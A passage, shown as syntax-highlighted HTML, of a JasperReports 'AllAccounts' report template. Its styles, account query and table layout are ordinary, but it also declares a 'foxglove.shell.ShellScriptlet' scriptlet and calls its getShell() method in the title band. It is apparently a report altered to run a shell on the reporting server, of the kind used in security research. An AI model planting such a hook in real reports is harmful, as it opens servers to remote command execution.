6.0.0 --&gt;</span></div><div class="line"><span class="comment">&lt;!-- 2016-10-04T14:01:12 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jasperReport</span> <span class="attr">xmlns</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd"</span> <span class="attr">name</span>=<span class="string">"AllAccounts"</span> <span class="attr">pageWidth</span>=<span class="string">"595"</span> <span class="attr">pageHeight</span>=<span class="string">"842"</span> <span class="attr">whenNoDataType</span>=<span class="string">"AllSectionsNoDetail"</span> <span class="attr">columnWidth</span>=<span class="string">"515"</span> <span class="attr">leftMargin</span>=<span class="string">"40"</span> <span class="attr">rightMargin</span>=<span class="string">"40"</span> <span class="attr">topMargin</span>=<span class="string">"50"</span> <span class="attr">bottomMargin</span>=<span class="string">"50"</span> <span class="attr">isSummaryWithPageHeaderAndFooter</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"17f4b3c5-e096-4a65-b030-ed3bb58ce311"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.language"</span> <span class="attr">value</span>=<span class="string">"EN-US"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Normal"</span> <span class="attr">isDefault</span>=<span class="string">"true"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Bold"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span> <span class="attr">isBold</span>=<span class="string">"true"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Italic"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span> <span class="attr">isItalic</span>=<span class="string">"true"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"PageHeader"</span> <span class="attr">style</span>=<span class="string">"Sans_Bold"</span> <span class="attr">forecolor</span>=<span class="string">"#FFFFFF"</span> <span class="attr">backcolor</span>=<span class="string">"#333333"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"detail"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span>&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">conditionalStyle</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">conditionExpression</span>&gt;</span>&lt;![CDATA[new Boolean($V&#123;CityGroup_COUNT&#125;.intValue() % 2 == 0)]]&gt;<span class="tag">&lt;/<span class="name">conditionExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">backcolor</span>=<span class="string">"#E0E0E0"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;/<span class="name">conditionalStyle</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">subDataset</span> <span class="attr">name</span>=<span class="string">"Table Dataset 1"</span> <span class="attr">uuid</span>=<span class="string">"4fcc1d09-9859-48ee-bb6f-8d369bd49113"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">queryString</span>&gt;</span></div><div class="line">&lt;![CDATA[SELECT name, phone_office, billing_address_city, billing_address_street, billing_address_country FROM accounts ORDER BY billing_address_country, billing_address_city]]&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">queryString</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"phone_office"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_city"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_street"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_country"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">sortField</span> <span class="attr">name</span>=<span class="string">"billing_address_country"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">sortField</span> <span class="attr">name</span>=<span class="string">"billing_address_city"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">variable</span> <span class="attr">name</span>=<span class="string">"CityyNumber"</span> <span class="attr">class</span>=<span class="string">"java.lang.Integer"</span> <span class="attr">incrementType</span>=<span class="string">"Group"</span> <span class="attr">incrementGroup</span>=<span class="string">"CityGroup"</span> <span class="attr">calculation</span>=<span class="string">"Count"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">variableExpression</span>&gt;</span>&lt;![CDATA[Boolean.TRUE]]&gt;<span class="tag">&lt;/<span class="name">variableExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">initialValueExpression</span>&gt;</span>&lt;![CDATA[new Integer(0)]]&gt;<span class="tag">&lt;/<span class="name">initialValueExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">variable</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">group</span> <span class="attr">name</span>=<span class="string">"CityGroup"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">groupExpression</span>&gt;</span>&lt;![CDATA[$F&#123;billing_address_city&#125;]]&gt;<span class="tag">&lt;/<span class="name">groupExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">subDataset</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">scriptlet</span> <span class="attr">name</span>=<span class="string">"ShellScriptlet"</span> <span class="attr">class</span>=<span class="string">"foxglove.shell.ShellScriptlet"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">scriptletDescription</span>&gt;</span>&lt;![CDATA[]]&gt;<span class="tag">&lt;/<span class="name">scriptletDescription</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"79"</span> <span class="attr">splitType</span>=<span class="string">"Stretch"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"227"</span> <span class="attr">y</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">uuid</span>=<span class="string">"32a2a8ff-d90a-48d7-b044-5325b5c6264f"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">pageFooter</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"40"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">line</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"10"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"1"</span> <span class="attr">uuid</span>=<span class="string">"19826638-0487-4bb5-9b15-7e7af63b8dce"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.table"</span> <span class="attr">value</span>=<span class="string">"end"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">line</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"200"</span> <span class="attr">y</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"80"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">uuid</span>=<span class="string">"6f072af1-756c-49f4-82f3-af59e8124296"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Right"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Page " + String.valueOf($V&#123;PAGE_NUMBER&#125;) + " of"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span> <span class="attr">evaluationTime</span>=<span class="string">"Report"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"280"</span> <span class="attr">y</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"75"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">uuid</span>=<span class="string">"02b15e9e-d360-4b82-a140-54b9bd3b0e81"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Left"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" " + String.valueOf($V&#123;PAGE_NUMBER&#125;)]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">pageFooter</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">summary</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"149"</span> <span class="attr">splitType</span>=<span class="string">"Stretch"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">scaleImage</span>=<span class="string">"Clip"</span> <span class="attr">hAlign</span>=<span class="string">"Right"</span> <span class="attr">vAlign</span>=<span class="string">"Middle"</span> <span class="attr">onErrorType</span>=<span class="string">"Icon"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"71"</span> <span class="attr">width</span>=<span class="string">"250"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"aa8a8976-039f-45ac-84f3-d8d55b442410"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">imageExpression</span>&gt;</span>&lt;![CDATA["repo:LogoLink"]]&gt;<span class="tag">&lt;/<span class="name">imageExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">hyperlinkTooltipExpression</span>&gt;</span>&lt;![CDATA["JasperReports Logo"]]&gt;<span class="tag">&lt;/<span class="name">hyperlinkTooltipExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">scaleImage</span>=<span class="string">"Clip"</span> <span class="attr">hAlign</span>=<span class="string">"Right"</span> <span class="attr">vAlign</span>=<span class="string">"Middle"</span> <span class="attr">onErrorType</span>=<span class="string">"Icon"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">x</span>=<span class="string">"265"</span> <span class="attr">y</span>=<span class="string">"71"</span> <span class="attr">width</span>=<span class="string">"250"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"4b5dd0d1-9011-42cf-ab07-f80c02d3d166"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">imageExpression</span>&gt;</span>&lt;![CDATA["repo:AllAccounts_Res2"]]&gt;<span class="tag">&lt;/<span class="name">imageExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">hyperlinkTooltipExpression</span>&gt;</span>&lt;![CDATA["Jaspersoft Logo"]]&gt;<span class="tag">&lt;/<span class="name">hyperlinkTooltipExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">componentElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">key</span>=<span class="string">"table"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"db3dd84a-3743-43b3-ab7e-c4aebdb907df"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:table</span> <span class="attr">xmlns:jr</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports/components"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports/components http://jasperreports.sourceforge.net/xsd/components.xsd"</span> <span class="attr">whenNoDataType</span>=<span class="string">"AllSectionsNoDetail"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">datasetRun</span> <span class="attr">subDataset</span>=<span class="string">"Table Dataset 1"</span> <span class="attr">uuid</span>=<span class="string">"3b2a079f-f600-46a6-a7af-720c4e939e7e"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">connectionExpression</span>&gt;</span>&lt;![CDATA[$P&#123;REPORT_CONNECTION&#125;]]&gt;<span class="tag">&lt;/<span class="name">connectionExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">datasetRun</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnGroup</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">uuid</span>=<span class="string">"1e5d630a-c8f9-4dbb-8415-393f7624ca35"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:groupHeader</span> <span class="attr">groupName</span>=<span class="string">"CityGroup"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:cell</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"Sans_Bold"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"14"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">backcolor</span>=<span class="string">"#C0C0C0"</span> <span class="attr">uuid</span>=<span class="string">"aeafecc2-ef7e-435c-ae07-1f45ed6b179a"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Left"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" " + String.valueOf($V&#123;CityyNumber&#125;.intValue() + 1) + ". " + $F&#123;billing_address_city&#125;+ ", " + $F&#123;billing_address_country&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">anchorNameExpression</span>&gt;</span>&lt;![CDATA[String.valueOf($F&#123;billing_address_city&#125;)]]&gt;<span class="tag">&lt;/<span class="name">anchorNameExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:cell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:groupHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">uuid</span>=<span class="string">"43ffff20-e89f-4f73-ad8d-878e9581274a"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"a76dcb9c-8601-48bc-b9cc-3d1c316e537d"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.colspan"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" "]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"73a40f28-2c08-4849-a2a9-b83ade7a6b7d"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"10"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Right"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$V&#123;CityGroup_COUNT&#125;+"."]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">uuid</span>=<span class="string">"d472eeed-282a-402b-9044-a397ca270655"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"bd0d4582-5684-4e15-8623-b3f1940bf1bb"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.colspan"</span> <span class="attr">value</span>=<span class="string">"2"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Name"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"23562605-5611-41d8-8a40-98ad9d28834a"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"5"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;name&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">uuid</span>=<span class="string">"4612e5a3-cb0d-4533-9b54-9ad9828acbed"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"d81f1db2-9f2e-4665-aa47-3d1a49cc9d15"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"10"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Phone"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span 